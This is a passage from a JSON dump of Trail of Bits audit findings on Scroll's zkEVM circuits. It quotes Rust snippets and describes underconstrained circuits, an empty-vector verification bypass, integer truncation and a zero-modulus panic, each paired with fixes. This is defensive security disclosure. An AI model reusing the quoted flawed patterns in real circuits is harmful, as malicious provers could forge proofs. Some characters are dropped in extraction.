        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The zkEVM circuit checks memory read and write operations in a transactions execution trace by performing lookups into the RW table. Within the circuit, updates to the state variable, which tracks the total number of read/write operations, are frequently specied with a manual count. That manual process is error-prone and dicult to check, and it can be replaced with a calculated value in all cases we have seen. The read-write consistency checks in the zkEVM circuit require the overall block to have a correct count of the total number of lookups into the RW table. If that count is incorrect, a malicious prover can insert extraneous write operations into the table and choose an arbitrary result for any memory read (see TOB-SCROLL-8 for a detailed explanation). Each execution gadget is individually responsible for creating a StepStateTransition that enforces the correct update of the rw_counter eld of StepState. For example, gure 15.1 shows the StepStateTransition for the AddSubGadget. There are three RW lookups caused by the stack_pop() calls, and thus the rw_counter_field is set to Delta(3), representing an increase by three. // ADD: Pop a and b from the stack, push c on the stack // SUB: Pop c and b from the stack, push a on the stack cb.stack_pop(select::expr(is_sub.expr().0, c.expr(), a.expr())); cb.stack_pop(b.expr()); cb.stack_push(select::expr(is_sub.expr().0, a.expr(), c.expr())); // State transition let step_state_transition = StepStateTransition { rw_counter: Delta(3.expr()), program_counter: Delta(1.expr()), stack_pointer: Delta(1.expr()), gas_left: Delta(-OpcodeId::ADD.constant_gas_cost().expr()), ..StepStateTransition::default() }; let same_context = SameContextGadget::construct(cb, opcode, step_state_transition); Figure 15.1: The rw_counter update in AddSubGadget (zkevm-circuits/src/evm_circuit/execution/add_sub.rs#5165) However, many execution gadgets have much more complicated rw_counter updates, which are dicult to check for correctness. To illustrate this complexity, consider gures 15.2 and 15.3, which show ErrorInvalidOpcodeGadget and ErrorWriteProtectionGadget. Each of them uses the CommonErrorGadget, which has an RW counter delta as the third parameter. However, ErrorInvalidOpcodeGadget does not seem to contain any RW lookups at all, but provides the value 2, while ErrorWriteProtectionGadget seems to have either one or four RW lookups depending on the value of is_call, yet provides a 0 to CommonErrorGadget. fn configure(cb: &mut ConstraintBuilder<F>) -> Self { let opcode = cb.query_cell(); cb.add_lookup( \"Responsible opcode lookup\", Lookup::Fixed { tag: FixedTableTag::ResponsibleOpcode.expr(), values: [ Self::EXECUTION_STATE.as_u64().expr(), opcode.expr(), 0.expr(), ], }, ); let common_error_gadget = CommonErrorGadget::construct(cb, opcode.expr(), 2.expr()); Figure 15.2: ErrorInvalidOpcodeGadget (zkevm-circuits/src/evm_circuit/execution/error_invalid_opcode.rs#2741) fn configure(cb: &mut ConstraintBuilder<F>) -> Self { ... // Lookup values from stack if opcode is call // Precondition: If there's a StackUnderflow CALL, is handled before this error cb.condition(is_call.expr(), |cb| { cb.stack_pop(gas_word.expr()); cb.stack_pop(code_address_word.expr()); cb.stack_pop(value.expr()); //cb.require_zero(\"value of call is not zero\", // is_value_zero.expr()); }); // current call context is readonly cb.call_context_lookup(false.expr(), None, CallContextFieldTag::IsStatic, 1.expr()); // constrain not root call as at least one previous staticcall preset. cb.require_zero( \"ErrorWriteProtection only happen in internal call\", cb.curr.state.is_root.expr(), ); let common_error_gadget = CommonErrorGadget::construct(cb, opcode.expr(), 0.expr()); Figure 15.3: ErrorWriteProtectionGadget (evm_circuit/execution/error_write_protection.rs#3380) In ErrorInvalidOpcodeGadget, there are in fact two total RW lookups; however, unintuitively, they occur inside CommonErrorGadget itself, as shown in gure 15.4. Thus, any caller of CommonErrorGadget eectively must add two to the value of rw_counter_delta. pub(crate) fn construct_with_lastcallee_return_data( cb: &mut ConstraintBuilder<F>, opcode: Expression<F>, rw_counter_delta: Expression<F>, return_data_offset: Expression<F>, return_data_length: Expression<F>, ) -> Self { cb.opcode_lookup(opcode.expr(), 1.expr()); let rw_counter_end_of_reversion = cb.query_cell(); // current call must be failed. cb.call_context_lookup(false.expr(), None, CallContextFieldTag::IsSuccess, 0.expr()); cb.call_context_lookup( false.expr(), None, CallContextFieldTag::RwCounterEndOfReversion, rw_counter_end_of_reversion.expr(), ); Figure 15.4: Two RW lookups inside CommonErrorGadget (zkevm-circuits/src/evm_circuit/util/common_gadget.rs#10191038) The case of ErrorWriteProtectionGadget is somewhat more complex but illustrates a useful alternative to manually counting lookups. CommonErrorGadget is called with an rw_counter_delta value of 0. One might expect that this is incorrect; it should count the two lookups inside CommonErrorGadget, plus one unconditional lookup and three conditional lookups outside. However, upon closer inspection, CommonErrorGadget only uses rw_counter_delta at all when curr.state.is_root is true. ErrorWriteProtectionGadget can occur only inside of a static call, and the root call of a transaction is never a static calltherefore, that case is never active and the value of rw_counter_delta can be set to a dummy value, in this case, 0. Instead, RestoreContextGadget handles the RW counter update, basing it on a call to ConstraintBuilder::rw_counter_offset, as shown in gure 15.5. Since rw_counter_offset is updated automatically in each call to ConstraintBuilder::rw_lookup, that count is correct by construction. let rw_counter_offset = cb.rw_counter_offset() + subsequent_rw_lookups + not::expr(is_success.expr()) * cb.curr.state.reversible_write_counter.expr(); // Do step state transition cb.require_step_state_transition(StepStateTransition { rw_counter: Delta(rw_counter_offset), call_id: To(caller_id.expr()), is_root: To(caller_is_root.expr()), is_create: To(caller_is_create.expr()), code_hash: To(caller_code_hash.expr()), program_counter: To(caller_program_counter.expr()), stack_pointer: To(caller_stack_pointer.expr()), gas_left: To(gas_left), memory_word_size: To(caller_memory_word_size.expr()), reversible_write_counter: To(reversible_write_counter), log_id: Same, }); Figure 15.5: The rw_counter update in RestoreContextGadget (zkevm-circuits/src/evm_circuit/util/common_gadget.rs#185202) In general, the process of counting the number of RW lookups in any given gadget is both subtle and tedious when done manually, but cases that use ConstraintBuilder::rw_counter_offset to determine that oset are eectively trivial when checking for correctness. CreateGadget has very complex logic, including three dierent conditional calls to require_step_state_transition and a large number of RW lookups. However, each StepStateTransition computes its RW counter update automatically, as illustrated in gure 15.6. cb.condition(not::expr(is_precheck_ok.expr()), |cb| { // Save caller's call state for field_tag in [ CallContextFieldTag::LastCalleeId, CallContextFieldTag::LastCalleeReturnDataOffset, CallContextFieldTag::LastCalleeReturnDataLength, ] { } cb.call_context_lookup(true.expr(), None, field_tag, 0.expr()); cb.require_step_state_transition(StepStateTransition { rw_counter: Delta(cb.rw_counter_offset()), program_counter: Delta(1.expr()), stack_pointer: Delta(2.expr() + IS_CREATE2.expr()), memory_word_size: To(memory_expansion.next_memory_word_size()), // - (Reversible) Write TxAccessListAccount (Contract Address) reversible_write_counter: Delta(1.expr()), gas_left: Delta(-gas_cost.expr()), ..StepStateTransition::default() }); }); Figure 15.6: One possible rw_counter update in CreateGadget (zkevm-circuits/src/evm_circuit/execution/create.rs#337357) By contrast, CallOpGadget has three dierent StepStateTransitions, each of which has a manually constructed RW counter oset. This includes the StepStateTransition shown in gure 15.7, which counts a grand total of 41 RW lookups plus four conditional osets, all of which need to be veried to be correct. let transfer_rwc_delta = is_call.expr() * not::expr(transfer.value_is_zero.expr()) * 2.expr(); let rw_counter_delta = 41.expr() + is_call.expr() * 1.expr() + transfer_rwc_delta.clone() + is_callcode.expr() + is_delegatecall.expr() * 2.expr(); cb.require_step_state_transition(StepStateTransition { rw_counter: Delta(rw_counter_delta), call_id: To(callee_call_id.expr()), is_root: To(false.expr()), is_create: To(false.expr()), code_hash: To(call_gadget.phase2_callee_code_hash.expr()), gas_left: To(callee_gas_left), // For CALL opcode, `transfer` invocation has two account write if value is not // zero. reversible_write_counter: To(transfer_rwc_delta), ..StepStateTransition::new_context() }); Figure 15.7: One rw_counter update in CallOpGadget (zkevm-circuits/src/evm_circuit/execution/callop.rs#440458) Recommendations Short term, replace magic-number RW counter updates with computed values, such as those provided by ConstraintBuilder::rw_counter_offset. Long term, consider redesigning the API for building StepStateTransitions. Since all RW lookups are performed via the ConstraintBuilder API, updates to simple counter-style state variables, such as the stack pointer and the RW counter, can typically be computed rather than manually specied. If the easy-to-calculate elds are always computed, that core computation can be checked for correctness; as a result, all uses will be correct by construction.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "16. Native PCS accumulation deciders accept an empty vector ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "Both the KZG and IPA native decide_all implementations accept an empty vector of accumulators. This can allow an attacker to bypass verication by submitting an empty vector. fn decide_all( dk: &Self::DecidingKey, accumulators: Vec<IpaAccumulator<C, NativeLoader>>, ) -> bool { !accumulators .into_iter() .any(|accumulator| !Self::decide(dk, accumulator)) } Figure 16.1: snark-verifier/src/pcs/kzg/decider.rs#L54-L69 This function contrasts with the EVM loader implementation that asserts that the accumulator vector is non-empty: fn decide_all( dk: &Self::DecidingKey, mut accumulators: Vec<KzgAccumulator<M::G1Affine, Rc<EvmLoader>>>, ) -> Result<(), Error> { assert!(!accumulators.is_empty()); Figure 16.2: snark-verifier/src/pcs/kzg/decider.rs#L120-L124 Exploit Scenario An attacker is able to control the arguments to decide_all and passes an empty vector, causing the verication function to accept an invalid proof. Recommendations Short term, add an assertion that validates that the vector is non-empty. Long term, add negative tests for verication and validation functions, ensuring that wrong or invalid arguments are not accepted.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "17. The ErrorOOGSloadSstore and the ErrorOOGLog gadgets have redundant table lookups ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "Both the ErrorOOGSloadSstore and the ErrorOOGLog gadgets do an RW table lookup to check whether the current call is within a static context. However, the lookup result is not used in any subsequent constraint, making the lookup redundant. // constrain not in static call let is_static_call = cb.call_context(None, CallContextFieldTag::IsStatic); //cb.require_zero(\"is_static_call is false in LOGN\", is_static_call.expr()); Figure 17.1: evm_circuit/execution/error_oog_log.rs#L53-L55 The commented-out constraint would provide a clear state distinction between the ErrorOOGLogGadget error case and the ErrorWriteProtectionGadget, preventing an attacker from arbitrarily choosing one of the error states at will. As far as we know, in this case, these two dierent error execution states do not translate to diverging EVM states; thus, this ndings severity is informational. Recommendations Short term, decide whether to remove the RW table lookup or to uncomment the non-static environment constraint in both the ErrorOOGSloadSstore and ErrorOOGLog gadgets. Investigate all commented-out constraints and remove them from the codebase, or enable them if they are necessary.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "18. The State circuit does not enforce transaction receipt constraints ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The implementation of the State circuit does not enforce transaction receipt constraints. Currently, these have an unsatisable constraint (1 == 0), and the function that implements them, build_tx_receipt_constraints, is not called in the ConstraintBuilder::build function. fn build_tx_receipt_constraints(&mut self, q: &Queries<F>) { // TODO: implement TxReceipt constraints self.require_equal(\"TxReceipt rows not implemented\", 1.expr(), 0.expr()); self.require_equal( \"state_root is unchanged for TxReceipt\", q.state_root(), q.state_root_prev(), ); self.require_zero( \"value_prev_column is 0 for TxReceipt\", q.value_prev_column(), ); } Figure 18.1: state_circuit/constraint_builder.rs#L511-L524 Recommendations Short term, implement the transaction receipt constraints and add them to the constraint builder build function. Long term, enable the dead_code compiler lint by removing the #![allow(dead_code)] line in zkevm-circuits/src/lib.rs and x all warnings.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "20. The EXP opcode has an unused witness ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The EXP opcode denes a witness that is used only in a constraint requiring its value to be zero. The constraint label suggests that it was used to validate the base_sq witness value at some point in the code development, but this is now done in the exponentiation table circuit. let zero_rlc = cb.query_word_rlc(); cb.require_zero( \"base * base + c == base^2 (c == 0)\", sum::expr(&zero_rlc.cells), ); Figure 20.1: evm_circuit/execution/exp.rs#L93-L97 Recommendations Short term, remove the zero_rlc variable and its constraint from the EXP opcode gadget.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "21. The bn_to_eld function silently truncates big integers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The bn_to_field function converts arbitrary length integers into a eld element. However, if the byte representation of the integers is larger than 64 bytes, the big integer bytes will be silently truncated. This means that any two integers with the same 512 least signicant bits will lead to the same eld element. pub fn bn_to_field<F: FieldExt>(bn: &BigUint) -> F { let mut bytes = bn.to_bytes_le(); bytes.resize(64, 0); F::from_bytes_wide(&bytes.try_into().unwrap()) } Figure 21.1: src/utils/mod.rs#L10-L15 Instead, the function should check whether the big integer ts into the eld capacity by using the F::capacity constant. This would guarantee a faithful representation of the big integer into the eld element and a successful reconversion back to the BigUint type. Note that the from_bytes_wide function will also reduce the element modulo the eld order so that it is represented as a eld element. Exploit Scenario An attacker provides two big integers with the same 512 least signicant bits to the bn_to_field function, causing it to return the same element. When these elements are used in future operations, they will lead to the same result, even though they were dierent. Recommendations Short term, add documentation to the function explaining the intended behavior; add checks that validate that the big integer is representable in the chosen eld.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "22. The eld_to_bn function depends on implementation-specic details of the underlying eld ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The implementation of the field_to_bn function calls the to_repr function on the value of the input f when constructing the little-endian binary representation of the input f. pub fn field_to_bn<F: FieldExt>(f: &F) -> BigUint { let bytes = f.to_repr(); BigUint::from_bytes_le(bytes.as_ref()) } Figure 22.1: The implementation of field_to_bn expects to_repr to return a little-endian representation of the value of f. (src/utils/mod.rs#L5-L8) However, according to the documentation of the PrimeField trait, the endianness returned by PrimeField::to_repr is implementation-dependent and may be dierent depending on the underlying eld. /// Converts an element of the prime field into the standard byte representation for /// this field. /// /// The endianness of the byte representation is implementation-specific. Generic /// encodings of field elements should be treated as opaque. fn to_repr(&self) -> Self::Repr; Figure 22.2: The value returned by to_repr is implementation-dependent and should be treated as opaque by the user. Exploit Scenario The field_to_bn function is reused with a scalar eld F that uses a dierent internal representation of the elements of F. The resulting big integer might not correspond to the same eld element. Recommendations Short term, implement a function that assuredly returns a little-endian representation of the eld element. Long term, review the use of third-party APIs to ensure that the codebase does not depend on the internal representation of data.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "23. The values of the bytecode table tag column are not constrained to be HEADER or BYTE ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The bytecode table has a column that indicates the TAG of each row. Currently, the TAG cells are assigned only a HEADER or a BYTE value. However, the circuit does not constrain the TAG value of each row to accept only these values. This missing constraint does not cause a direct soundness issue because of other indirect constraints and how the bytecode circuit is implemented, but future code refactorings could cause the issue to become exploitable. The bytecode table contains the set of bytecodes that are executed in a block. For each bytecode, the table contains a HEADER row, followed by BYTE rows corresponding to each byte of the bytecode, and a nal HEADER row. The circuit imposes constraints for each type of row (e.g., gure 23.1 shows how a HEADER row is constrained to have an index column value of 0), and for transitions between two rows (e.g., transitioning from a HEADER row to a BYTE row, the length column must stay the same). // When is_header -> // assert cur.index == 0 // assert cur.value == cur.length meta.create_gate(\"Header row\", |meta| { let mut cb = BaseConstraintBuilder::default(); cb.require_zero( \"cur.index == 0\", meta.query_advice(bytecode_table.index, Rotation::cur()), ); cb.require_equal( \"cur.value == cur.length\", meta.query_advice(bytecode_table.value, Rotation::cur()), meta.query_advice(length, Rotation::cur()), ); cb.gate(and::expr(vec![ meta.query_fixed(q_enable, Rotation::cur()), not::expr(meta.query_fixed(q_last, Rotation::cur())), is_header(meta), ])) }); Figure 23.1: zkevm-circuits/src/bytecode_circuit/circuit.rs#L178-L200 To check whether a row is a HEADER or a BYTE row, the implementation performs steps that rely on particular assumptions:  It implicitly assumes that the enum value corresponding to HEADER is 0 and the one to BYTE is 1. This assumption can be broken in the future if a developer adds an extra enum eld on the BytecodeFieldTag enum.  It uses Boolean operators and::expr, not::expr on the bytecode tag values. These operators must operate only on Boolean values; otherwise, they will return an unexpected value.  It gates the constraints with conjunctions resulting from the and::expr operator: if a lookup is guarded by the conjunction of non-Boolean values, the value that is looked up will be a scaled version of the intended value. let is_byte_to_byte = |meta: &mut VirtualCells<F>| { and::expr(vec![ meta.query_advice(bytecode_table.tag, Rotation::cur()), meta.query_advice(bytecode_table.tag, Rotation::next()), ]) }; let is_header = |meta: &mut VirtualCells<F>| { not::expr(meta.query_advice(bytecode_table.tag, Rotation::cur())) }; let is_byte = |meta: &mut VirtualCells<F>| meta.query_advice(bytecode_table.tag, Rotation::cur()); Figure 23.2: zkevm-circuits/src/bytecode_circuit/circuit.rs#L125-L137 The soundness of all these steps and implementation details rely on the bytecode tag value being Boolean. However, the implementation does not have a constraint validating that the TAG values are, in fact, Boolean. If a malicious prover were to provide a non-Boolean value, since the not::expr and and::expr functions operate under the assumption that their input values are Boolean, the circuit will have soundness issues. One avenue of exploitation is on the push_data_size_table_lookup on the bytecode table: this lookup is gated on the is_byte(meta) constraint, causing it to be implicitly scaled to a dierent lookup if the is_byte(meta) result is non-Boolean. This would allow a malicious prover to obtain the wrong push_data_size from the push_data_size_table_lookup table and provide an incorrect bytecode with respect to the is_code column. In other words, the data pushed in a PUSH* opcode could be marked as code, then allowing the EVM execution to follow an execution ow incompatible with EVM semantics. meta.lookup_any( \"push_data_size_table_lookup(cur.value, cur.push_data_size)\", |meta| { let enable = and::expr(vec![ meta.query_fixed(q_enable, Rotation::cur()), not::expr(meta.query_fixed(q_last, Rotation::cur())), is_byte(meta), ]); let lookup_columns = vec![value, push_data_size]; let mut constraints = vec![]; for i in 0..PUSH_TABLE_WIDTH { constraints.push(( enable.clone() * meta.query_advice(lookup_columns[i], Rotation::cur()), meta.query_fixed(push_table[i], Rotation::cur()), )) } constraints }, ); Figure 23.3: zkevm-circuits/src/bytecode_circuit/circuit.rs#L220-L241 However, a row with a non-Boolean TAG actually satises both the is_header(meta) and is_byte(meta) constraints. Thus, for an attacker to be successful, they would have to satisfy an unsatisable set of constraints on the index column:  is_header: requires cur.index == 0  is_header_to_byte: requires next.index == 0  is_byte_to_byte : requires next.index == cur.index + 1 There exists another avenue of exploiting the missing constraint that requires the TAG value to equal BYTE or HEADER. If a malicious prover were able to inject rows in the table with a dierent TAG value, they would be able to disable the BYTE-TO-BYTE, BYTE-TO-HEADER, HEADER-TO-HEADER, and HEADER-TO-BYTE transition constraints. As an example, if between two HEADER rows there existed a row dierent from HEADER or BYTE, the HEADER-TO-HEADER transition gate would always be false. This exploit scenario is unexploitable for the same reason as the previous exploit. However, while correctly enforcing the is_header, is_header_to_byte, is_byte_to_byte, is_header_to_header, is_byte, and is_byte_to_header transition constraints to accept only the HEADER and BYTE values would prevent the push_data_size_table_lookup exploit, it would not prevent the row-to-row transition constraints from being broken. For a complete x, it is necessary to constrain the TAG value to be one of HEADER or BYTE. Exploit Scenario Anticipating a future addition to the TAG enum, a developer decides to reimplement the is_header, is_byte, and transition selectors by requiring that the TAG cell value equals the desired enum value. If they omit the check that the TAG value must be restricted to the enums value set, a malicious prover would be able to break the transition constraints by inserting a row with a tag value dierent from HEADER or BYTE. Recommendations Short term, require that the TAG column is Boolean in the constraint system; make the BytecodeFieldTag values explicitly 0 and 1 by dening the enum as follows: pub enum BytecodeFieldTag { /// Header field Header = 0, /// Byte field Byte = 1, } Figure 23.4: Explicit enum denition Document which constraints need to be changed in case the BytecodeFieldTag enum is extended. Long term, add stricter types to the Boolean functions in gadgets/src/util.rs. These functions, as their documentation states, should operate only on Boolean values. Enforcing this in the type system would allow cases where this assumption is violated to be found and would prevent potential soundness issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "24. Unconstrained columns on the bytecode HEADER rows ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The bytecode table HEADER rows have two unconstrained columns, is_code and field_input, on the Poseidon bytecode extended columns. The lack of constraints on these columns does not seem to pose any soundness issue, but constraining these columns would serve as defense-in-depth, preventing the circuits exibility from allowing a malicious prover to exploit a soundness issue if a vulnerability is introduced in the future. Figure 24.1 shows the HEADER row constraints, and no constraint related to the is_code column. meta.create_gate(\"Header row\", |meta| { let mut cb = BaseConstraintBuilder::default(); cb.require_zero( \"cur.index == 0\", meta.query_advice(bytecode_table.index, Rotation::cur()), ); cb.require_equal( \"cur.value == cur.length\", meta.query_advice(bytecode_table.value, Rotation::cur()), meta.query_advice(length, Rotation::cur()), ); cb.gate(and::expr(vec![ meta.query_fixed(q_enable, Rotation::cur()), not::expr(meta.query_fixed(q_last, Rotation::cur())), is_header(meta), ])) }); Figure 24.1: zkevm-circuits/src/bytecode_circuit/circuit.rs#L179-L201 Recommendations Short term, add constraints for the is_code and the field_input rows in the HEADER rows of the bytecode table. Long term, document all table constraints and ensure that each type of row constrains all columns.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "25. decompose_limb does not work as intended ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The for loop within decompose_limb requires bool_limbs to contain at least 31 elements to be correctly indexed from 0 to 30. Furthermore, if limbsize is large enough, then the truncate operation does not grow bool_limbs to the correct size, as to_radix_le produces a minimal Vec without any trailing zeroes. let mut bool_limbs = field_to_bn(&limb.value).to_radix_le(2); bool_limbs.truncate(limbsize); bool_limbs.reverse(); let mut v = F::zero(); for i in 0..27 { let l0 = F::from_u128(bool_limbs[i] as u128); let l1 = F::from_u128(bool_limbs[i+1] as u128); let l2 = F::from_u128(bool_limbs[i+2] as u128); let l3 = F::from_u128(bool_limbs[i+3] as u128); Figure 25.1: misc-precompiled-circuit/src/circuits/modexp.rs#L514-L522 Additionally, the Boolean limbs are not properly constrained to be Boolean, but this is mentioned in a TODO comment. Overall, it can be concluded that the decompose_limb needs further development, but its intended purpose and usage within mod_exp is clear. Recommendations Short term, correctly implement decompose_limb. This will allow for proper testing of the mod_exp circuit.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "26. Zero modulus will cause a panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "According to EVM specications, if the modulus is zero, then the result of mod_exp is zero regardless of the input. The current mod_exp code relies on successive calls to mod_mult with the passed-in modulus, but the mod_mult function computes a quotient that will panic. let bn_quotient = bn_mult.clone().div(bn_modulus.clone()); //div_rem Figure 26.1: misc-precompiled-circuit/src/circuits/modexp.rs#L470 This results in diering behavior between the scroll mod_exp precompile and the standard EVM precompile, which may cause some existing systems that depend on this behavior to not work as intended. Recommendations Short term, correctly handle the zero modulus case of mod_exp. Add tests to the mod_exp circuit, including some that exercise its edge cases: the zero exponent case and the zero modulus case.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "27. The ConstraintBuilder::condition API is dangerous ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The ConstraintBuilder implements several useful ways of constructing constraints. One case is when constraints should be added and conditioned by a particular value. If the value is true, the constraints must be satised; otherwise, they do not need to be satised. However, a problem arises if a developer forgets to consider that a new ConstraintBuilder function is called within the context of a condition. All functions in the ConstraintBuilder API must consider the case where they are being called from inside a conditioned scope. If these functions add constraints or change values irrespective of the condition value, they will lead to unintended results. As an example, the opcode_lookup function updates the program_counter_offset regardless of the current condition value. pub(crate) fn opcode_lookup(&mut self, opcode: Expression<F>, is_code: Expression<F>) { self.opcode_lookup_at( self.curr.state.program_counter.expr() + self.program_counter_offset.expr(), opcode, is_code, ); self.program_counter_offset += 1; } Figure 27.1: evm_circuit/util/constraint_builder.rs#608615 When used in a condition context, the program_counter_offset will be incremented irrespective of the condition value: const NAME: &'static str = \"STOP\"; const EXECUTION_STATE: ExecutionState = ExecutionState::STOP; fn configure(cb: &mut ConstraintBuilder<F>) -> Self { let code_length = cb.query_cell(); cb.bytecode_length(cb.curr.state.code_hash.expr(), code_length.expr()); let is_within_range = LtGadget::construct(cb, cb.curr.state.program_counter.expr(), code_length.expr()); let opcode = cb.query_cell(); cb.condition(is_within_range.expr(), |cb| { cb.opcode_lookup(opcode.expr(), 1.expr()); }); Figure 27.2: src/evm_circuit/execution/stop.rs#3345 The provided argument to the ConstraintBuilder::condition function must also be ensured to be Boolean. Certain functions assume this, and they would have unexpected results otherwise: pub(crate) fn stack_pop(&mut self, value: Expression<F>) { self.stack_lookup(false.expr(), self.stack_pointer_offset.clone(), value); self.stack_pointer_offset = self.stack_pointer_offset.clone() + self.condition_expr(); } pub(crate) fn stack_push(&mut self, value: Expression<F>) { self.stack_pointer_offset = self.stack_pointer_offset.clone() - self.condition_expr(); self.stack_lookup(true.expr(), self.stack_pointer_offset.expr(), value); } Figure 27.3: evm_circuit/util/constraint_builder.rs#11601169 The ConstraintBuilder::gate function is another dangerous pattern that should be reconsidered and documented. In its current state, the function clones all constraints and gates them with the provided selector, returning these new gated constraints. It does not change the current constraints, which might be an interpretation that a new developer might have about the function. We have not seen incorrect usage of this particular pattern. One way of at least ensuring that the returning set of constraints is used is by adding the #[must_use] attribute to the function. Recommendations Short term, redesign the ConstraintBuilder API, especially with respect to the condition function. Add new Rust types to ensure that the condition expression is Boolean. Add the #[must_use] attribute to the ConstraintBuilder::gate function.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. N_BYTES parameters are not checked to prevent overow ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The ConstantDivisionGadget and LtGadget circuits implement operations on multi-byte integers: division by a constant value and comparison, respectively. Each circuit has a generic parameter N_BYTES representing the number of bytes used. However, each of these circuits has additional implied restrictions on N_BYTES required to prevent unexpected behavior due to overowing eld elements. In ConstantDivisionGadget (shown in gure 5.1), the quotient value is constrained to _ 256 , but the expression quotient.expr() * denominator.expr() be less than may overow if denominator is suciently large (e.g., if denominator is 1024 and N_BYTES is 31. The comment highlighted in gure 5.2 provides sucient conditions to prevent overow, but these are not fully enforced either in the circuit or in assertions at circuit construction time. let quotient = cb.query_cell_with_type(CellType::storage_for_expr(&numerator)); let remainder = cb.query_cell_with_type(CellType::storage_for_expr(&numerator)); // Require that remainder < denominator cb.range_lookup(remainder.expr(), denominator); // Require that quotient < 256**N_BYTES // so we can't have any overflow when doing `quotient * denominator`. let quotient_range_check = RangeCheckGadget::construct(cb, quotient.expr()); // Check if the division was done correctly cb.require_equal( \"numerator - remainder == quotient  denominator\", numerator - remainder.expr(), quotient.expr() * denominator.expr(), ); Figure 5.1: zkevm-circuits/src/evm_circuit/util/math_gadget/constant_division.rs#33 /// Returns (quotient: numerator/denominator, remainder: numerator%denominator), /// with `numerator` an expression and `denominator` a constant. /// Input requirements: /// - `quotient < 256**N_BYTES` /// - `quotient * denominator < field size` /// - `remainder < denominator` requires a range lookup table for `denominator` #[derive(Clone, Debug)] pub struct ConstantDivisionGadget<F, const N_BYTES: usize> { Figure 5.2: zkevm-circuits/src/evm_circuit/util/math_gadget/constant_division.rs#13 20 In LtGadget (shown in gure 5.3), values of N_BYTES above 31 will cause lt to be an unconstrained Boolean, since a malicious prover can set diff to the representation of (rhs - lhs) even if rhs < lhs. The comment highlighted in gure 5.4 describes sucient conditions to prevent overow without changes to the circuit, but these restrictions are enforced only by a debug_assert! in from_bytes::expr (shown in gure 5.5). let lt = cb.query_bool(); let diff = cb.query_bytes(); let range = pow_of_two(N_BYTES * 8); // The equation we require to hold: `lhs - rhs == diff - (lt * range)`. cb.require_equal( \"lhs - rhs == diff - (lt  range)\", lhs - rhs, from_bytes::expr(&diff) - (lt.expr() * range), ); Figure 5.3: zkevm-circuits/src/evm_circuit/util/math_gadget/lt.rs#3746 /// Returns `1` when `lhs < rhs`, and returns `0` otherwise. /// lhs and rhs `< 256**N_BYTES` /// `N_BYTES` is required to be `<= MAX_N_BYTES_INTEGER` to prevent overflow: /// values are stored in a single field element and two of these are added /// together. /// The equation that is enforced is `lhs - rhs == diff - (lt * range)`. /// Because all values are `<= 256**N_BYTES` and `lt` is boolean, `lt` can only /// be `1` when `lhs < rhs`. #[derive(Clone, Debug)] pub struct LtGadget<F, const N_BYTES: usize> { Figure 5.4: zkevm-circuits/src/evm_circuit/util/math_gadget/lt.rs#1423 pub(crate) fn expr<F: FieldExt, E: Expr<F>>(bytes: &[E]) -> Expression<F> { debug_assert!( bytes.len() <= MAX_N_BYTES_INTEGER, \"Too many bytes to compose an integer in field\" ); Figure 5.5: zkevm-circuits/src/evm_circuit/util.rs#528532 Exploit Scenario A developer who is unaware of these issues uses the ConstantDivisionGadget or LtGadget circuit with values of N_BYTES that are too large, causing potentially underconstrained circuits. Recommendations Short term, add explicit checks at circuit construction time to ensure that N_BYTES is limited to values that prevent overow. Long term, consider performing these validations at compile time with static_assertions or asserts in a const context.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "6. Di\u0000erences in shared code between zkevm-circuits and halo2-lib ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
